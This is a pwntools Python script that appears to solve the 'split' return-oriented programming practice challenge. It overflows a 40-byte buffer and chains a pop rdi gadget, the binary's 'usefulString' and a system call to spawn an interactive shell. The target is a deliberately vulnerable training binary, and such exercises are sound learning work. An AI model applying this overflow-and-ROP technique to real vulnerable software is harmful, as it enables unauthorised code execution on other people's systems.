from pwn import *
import struct
import sys
import time

challenge = './split'

elf = ELF(challenge)
rop = ROP(elf)

function = elf.symbols['usefulFunction']
sh = elf.symbols['usefulString']
sys = 0x40074B

payload = cyclic(40) + p64(rop.rdi.address) + p64(sh) + p64(sys)  + b'\x00'#
io = process(challenge)
# io = gdb.debug(challenge, gdbscript='''
# 		br *0x0400741
# 		c
# 		x/20x $sp
# 		''')
print(io.recvuntil(b'> '))
io.send(payload)
# io.recvall()
io.interactive()
print('end')
# python -c "print('B' * 40 + '\x07\x42'[::-1], end='')" > totosigsetops.h